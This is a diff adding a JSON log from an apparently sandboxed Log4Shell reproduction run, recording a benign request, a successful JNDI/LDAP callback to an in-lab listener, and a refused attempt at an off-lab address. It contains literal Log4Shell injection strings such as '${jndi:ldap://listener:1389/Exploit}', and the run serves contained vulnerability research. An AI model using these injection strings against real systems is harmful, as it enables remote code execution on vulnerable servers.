@@ -1,0 +1,47 @@
+{
+  "run_at": "2026-11-14T18:27:49.595345+00:00",
+  "project": "cr-poc-log4shell",
+  "steps": [
+    {
+      "step": "benign_request",
+      "response": "logged='1.0' outcome=no-jndi",
+      "callbacks_after": 0,
+      "expected": "no callback",
+      "ok": true
+    },
+    {
+      "step": "crafted_injection",
+      "injection": "${jndi:ldap://listener:1389/Exploit}",
+      "response": "logged='${jndi:ldap://listener:1389/Exploit}' outcome=lookup-performed:listener:1389",
+      "new_callbacks": [
+        {
+          "event": "callback",
+          "peer_ip": "192.168.64.3",
+          "peer_port": 46226,
+          "first_bytes_hex": "6a6e64692d7265736f6c76650a",
+          "ts": "2026-11-14T18:27:51.471011+00:00"
+        }
+      ],
+      "expected": "one callback from victim",
+      "ok": true
+    },
+    {
+      "step": "offlab_target",
+      "injection": "${jndi:ldap://203.0.113.9:1389/Exploit}",
+      "response": "logged='${jndi:ldap://203.0.113.9:1389/Exploit}' outcome=refused-offlab-host:203.0.113.9",
+      "expected": "refused, no callback",
+      "ok": true
+    }
+  ],
+  "levels": {
+    "callback_behavior": "PASS",
+    "offlab_guard": "PASS"
+  },
+  "fidelity": {
+    "reproduced": [
+      "B2 (JNDI/LDAP callback observable)"
+    ],
+    "substitute": "Victim is an ASSUMED*SUBSTITUTED harmless stand-in (not real Log4j/Horizon); the listener is detection-only and returns no payload. Real Log4Shell RCE (B1) and Windows-only steps (B3/B10/B13/B17) are NOT reproduced here.",
+    "safety": "labnet internal:true (no egress); attack emitted from attacker container only; target and callback confined to in-lab containers."
+  }
+}
